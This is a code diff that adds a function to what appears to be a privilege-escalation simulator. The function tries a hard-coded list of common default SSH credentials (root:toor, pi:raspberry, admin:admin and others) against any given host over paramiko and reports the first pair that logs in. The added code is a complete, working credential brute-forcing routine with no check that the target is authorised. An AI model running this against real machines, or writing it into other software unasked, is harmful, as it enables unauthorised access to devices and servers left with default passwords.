@@ -89,6 +89,80 @@ def execute_remote_command(ssh_client: paramiko.SSHClient, command: str) -> Dict
     except Exception as e:
         return {"command": command, "error": str(e)}
 
+def try_default_ssh_credentials(hostname: str, port: int = 22) -> Dict[str, Any]:
+    """
+    Issue #14: Attempt common default SSH credentials.
+    Only called if rate limiting check passes.
+    
+    Returns:
+        {
+            "success": bool,
+            "credentials": {"username": str, "password": str} or None,
+            "attempts": int,
+            "message": str
+        }
+    """
+    # Short list of common default credentials
+    default_creds = [
+        ("admin", "admin"),
+        ("root", "root"),
+        ("root", "toor"),
+        ("admin", "password"),
+        ("pi", "raspberry"),
+        ("user", "user"),
+        ("ubuntu", "ubuntu"),
+        ("test", "test")
+    ]
+    
+    for username, password in default_creds:
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        
+        try:
+            ssh.connect(
+                hostname=hostname,
+                username=username,
+                password=password,
+                port=port,
+                timeout=10,
+                look_for_keys=False,
+                allow_agent=False
+            )
+            
+            # Success!
+            ssh.close()
+            return {
+                "success": True,
+                "credentials": {"username": username, "password": password},
+                "attempts": default_creds.index((username, password)) + 1,
+                "message": f"✓ Default credentials found: {username}:{password}"
+            }
+            
+        except paramiko.AuthenticationException:
+            # Expected - credentials didn't work, try next
+            pass
+        except Exception as e:
+            # Network issue or other error - stop trying
+            return {
+                "success": False,
+                "credentials": None,
+                "attempts": default_creds.index((username, password)) + 1,
+                "message": f"Brute-force stopped due to error: {str(e)}"
+            }
+        finally:
+            ssh.close()
+        
+        # Small delay between attempts (500ms) to be slightly respectful
+        time.sleep(0.5)
+    
+    return {
+        "success": False,
+        "credentials": None,
+        "attempts": len(default_creds),
+        "message": f"No default credentials found (tried {len(default_creds)} combinations)"
+    }
+
+
 def run_privesc(config: Dict[str, Any], ssh_creds: Dict[str, str]) -> Dict[str, Any]:
     """
     Main entry point for the Privilege Escalation Simulator.
